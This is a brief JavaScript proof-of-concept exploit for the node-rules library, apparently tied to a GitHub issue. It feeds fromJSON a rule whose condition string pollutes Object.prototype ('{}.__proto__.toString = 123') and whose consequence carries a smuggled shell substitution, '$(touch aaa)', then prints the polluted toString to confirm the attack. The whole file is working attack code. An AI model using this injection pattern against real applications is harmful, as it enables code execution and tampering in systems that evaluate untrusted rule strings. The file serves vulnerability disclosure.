//https://github.com/mithunsatheesh/node-rules/issues/84
var A = require("node-rules");
var rules = {
    condition:"{}.__proto__.toString = 123",
    consequence:"$(touch aaa)"
  }
var a = new A();
a.fromJSON(rules);
console.log({}.toString)
